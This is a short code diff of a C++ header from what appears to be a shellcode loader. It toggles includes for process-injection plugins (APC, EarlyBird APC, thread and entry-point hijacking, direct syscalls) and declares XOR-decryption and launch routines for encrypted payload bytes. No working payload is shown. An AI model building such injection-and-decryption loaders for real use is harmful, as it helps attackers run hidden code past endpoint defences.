@@ -10,23 +10,24 @@
 
 #include "Cryptography.h"
 #include "loadLibrary.h"
+#include <augustEncryption.h>
 
 #include "TLSLoad.h"
 
 
-#include "../plugin/directlyLoad.h"
-#include "../plugin/apcLoad.h"
-#include "../plugin/createThreatPoolWaitLoad.h"
-#include "../plugin/dynamicLoad.h"
-#include "../plugin/dynamicLoadPlusLoad.h"
-#include "../plugin/EarlyBirdAPC_InjetcLoad.h"
-#include "../plugin/fiberLoad.h"
-#include "../plugin/ntCreateSectionLoad.h"
-#include "../plugin/ntTestAlertLoad.h"
-#include "../plugin/OEPHiijack_InjectLoad.h"
-#include "../plugin/SEHExceptLoad.h"
-#include "../plugin/syscallLoad.h"
-#include "../plugin/threadHiijack_InjectLoad.h"
+//#include "../plugin/directlyLoad.h"
+//#include "../plugin/apcLoad.h"
+//#include "../plugin/createThreatPoolWaitLoad.h"
+//#include "../plugin/dynamicLoad.h"
+//#include "../plugin/dynamicLoadPlusLoad.h"
+//#include "../plugin/EarlyBirdAPC_InjetcLoad.h"
+//#include "../plugin/fiberLoad.h"
+//#include "../plugin/ntCreateSectionLoad.h"
+//#include "../plugin/ntTestAlertLoad.h"
+//#include "../plugin/OEPHiijack_InjectLoad.h"
+//#include "../plugin/SEHExceptLoad.h"
+//#include "../plugin/syscallLoad.h"
+//#include "../plugin/threadHiijack_InjectLoad.h"
 
 
 using startFunction = void (*)(const unsigned char *, const size_t &);
@@ -55,8 +56,8 @@ private:
     void func6N_XOR(long long int &diff, std::string &encryptedData);
     void funcFile_XOR(std::string &encryptedData);
 
+//    void launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength);
     void launchFunction(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength);
-    void launchFunctionV2(std::string function_mode, const unsigned char *decryptedData, size_t &byteLength);
     dllAndFunction getDllNameAndFuncName(const std::string &function_mode);
     std::string strXor(const std::string &data);
 
